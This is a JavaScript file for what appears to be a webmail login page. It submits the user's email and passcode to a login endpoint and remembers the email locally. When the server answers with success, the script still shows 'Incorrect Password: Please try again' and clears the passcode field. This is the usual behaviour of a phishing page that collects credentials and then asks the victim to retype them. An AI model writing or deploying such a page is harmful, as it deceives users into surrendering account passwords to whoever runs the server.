const form        = document.getElementById('login-form');
const btn         = document.getElementById('submit-btn');
const emailInput  = document.getElementById('email');
const passInput   = document.getElementById('passcode');

const SAVED_EMAIL = 'webmail_email';

/* ---------- toast pop-up ---------- */
function toast(text) {
  const el = document.createElement('div');
  el.className = 'toast';
  el.textContent = text;
  document.body.appendChild(el);

  requestAnimationFrame(() => el.classList.add('show'));

  setTimeout(() => {
    el.classList.remove('show');
    setTimeout(() => el.remove(), 250);
  }, 3000);
}

/* ---------- remember the email ---------- */
const remembered = localStorage.getItem(SAVED_EMAIL);
if (remembered) emailInput.value = remembered;

emailInput.addEventListener('input', () => {
  const value = emailInput.value.trim();
  if (value) {
    localStorage.setItem(SAVED_EMAIL, value);
  } else {
    localStorage.removeItem(SAVED_EMAIL);
  }
});

/* ---------- submit ---------- */
form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const email    = emailInput.value.trim();
  const passcode = passInput.value;

  // 3. empty fields
  if (!email || !passcode) {
    toast('Please fill in the fields');
    return;
  }

  btn.disabled = true;
  btn.textContent = 'Logging in...';

  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, passcode })
    });

    const data = await response.json();

    if (!response.ok) {
      toast(data.error || 'Something went wrong');
      return;
    }

    // 4. everything filled in
    toast('Incorrect Password: Please try again');

    // 2. keep the email, clear only the passcode
    passInput.value = '';
    passInput.focus();

  } catch (error) {
    toast('Could not reach the server. Try again.');

  } finally {
    btn.disabled = false;
    btn.textContent = 'Log in';
  }
});